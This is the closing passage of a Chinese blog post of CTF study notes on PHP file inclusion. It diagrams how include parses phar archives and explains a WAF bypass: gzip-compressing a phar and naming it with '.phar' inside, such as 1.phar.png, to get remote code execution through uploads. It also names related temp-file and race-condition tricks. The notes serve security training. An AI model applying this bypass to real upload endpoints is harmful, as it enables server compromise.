</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">用户请求</span><span class="o">:</span> <span class="k">include</span> <span class="s2">&#34;upload/evil.phar.jpg&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">PHP内核</span><span class="o">:</span> <span class="nx">compile_filename</span><span class="p">()</span> <span class="nx">处理文件名</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">Phar扩展拦截检测</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">打开文件流</span> <span class="nx">→</span> <span class="nx">rewind到起始位置</span><span class="p">(</span><span class="nx">rewind文件流操作函数，它的作用是：将文件指针重置到文件的开头位置。</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">循环检测文件格式</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">├─</span> <span class="nx">是GZIP</span><span class="o">?</span> <span class="p">(</span><span class="nx">\x1f\x8b\x08</span><span class="p">)</span> <span class="nx">→</span> <span class="nx">解压</span> <span class="nx">→</span> <span class="nx">rewind</span> <span class="nx">→</span> <span class="nx">重新检测是否为phar</span>
</span></span><span class="line"><span class="cl">    <span class="nx">├─</span> <span class="nx">是BZIP2</span><span class="o">?</span> <span class="p">(</span><span class="s2">&#34;BZh&#34;</span><span class="p">)</span> <span class="nx">→</span> <span class="nx">解压</span> <span class="nx">→</span> <span class="nx">rewind</span> <span class="nx">→</span> <span class="nx">重新检测</span>  
</span></span><span class="line"><span class="cl">    <span class="nx">├─</span> <span class="nx">是ZIP</span><span class="o">?</span> <span class="p">(</span><span class="s2">&#34;PK</span><span class="se">\x03\x04</span><span class="s2">&#34;</span><span class="p">)</span> <span class="nx">→</span> <span class="nx">phar_parse_zipfile</span><span class="p">()</span> <span class="nx">→</span> <span class="nx">解析完成</span>
</span></span><span class="line"><span class="cl">    <span class="nx">├─</span> <span class="nx">是TAR</span><span class="o">?</span> <span class="nx">→</span> <span class="nx">phar_parse_tarfile</span><span class="p">()</span> <span class="nx">→</span> <span class="nx">解析完成</span>
</span></span><span class="line"><span class="cl">    <span class="nx">└─</span> <span class="nx">其他格式</span> <span class="nx">→</span> <span class="nx">扫描</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">         <span class="nx">├─</span> <span class="nx">找到标记</span> <span class="nx">→</span> <span class="nx">phar_parse_pharfile</span><span class="p">()</span> <span class="nx">→</span> <span class="nx">解析完成</span>
</span></span><span class="line"><span class="cl">         <span class="nx">└─</span> <span class="nx">找不到标记</span> <span class="nx">→</span> <span class="nx">报错退出</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">解析成功</span> <span class="nx">→</span> <span class="nx">提取并执行stub代码</span>
</span></span><span class="line"><span class="cl">    <span class="nx">↓</span>
</span></span><span class="line"><span class="cl"><span class="nx">返回正常include流程</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">所以我们可以利用这过程绕过waf：
</span></span><span class="line"><span class="cl">上文我们知道php会默认把这个gz文件解压回phar进行解压，而文件经gz压缩后可以绕过文件上传内容检测waf,而且include判断逻辑是只要文件名里有.phar这几个字就会将文件当作phar解压，所以事实上我们完全不需要保证最后include的是一个xxx.phar.gzip文件，只要文件名里有.phar即可，所以说无论我们是include 1.phar.png还是1.phar.html均可以正常rce，这样我们就可以绕过文件上传的文件名waf，上传任意文件
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/"  target="_blank" rel="noopener"
    >当include邂逅phar——DeadsecCTF2025 baby-web – fushulingのblog</a></p>
<p>例题：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2025?CTF:来getshell 速度!
</span></span><span class="line"><span class="cl">2025Lilctf：php_jail_is_my_cry
</span></span></code></pre></td></tr></table>
</div>
</div><p>文件包含还一些手法例如<code>segfault遗留下的TEMP文件</code>(大概操作是通过某种操作让<strong>PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了</strong>从而包含它rce，不过仍需要打开allow_url_include)，phpinfo与条件竞争等，详情可看<a class="link" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"  target="_blank" rel="noopener"
    >Docker PHP裸文件本地包含综述 | 离别歌</a></p>
<h2 id="十php伪协议与死亡绕过">十:php伪协议与死亡绕过
</h2><p>未完待续</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/emo/">Emo</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>谢谢观看</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/%E6%96%B0%E5%8D%8E%E4%B8%89%E5%AE%9E%E4%B9%A0%E6%89%93%E9%9D%B6/">
        
        

        <div class="article-details">
            <h2 class="article-title">新华三实习打靶</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9Bawdp/">
        
        

        <div class="article-details">
            <h2 class="article-title">江西省赛awdp</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025极客大挑战</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E6%B1%9F%E8%A5%BF%E7%9C%81%E6%8C%AF%E5%85%B4%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-江西省振兴杯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E5%BC%BA%E7%BD%91%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-强网杯</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo=""
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 luokaihong
    </section>
    
    <section class="powerby">
        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
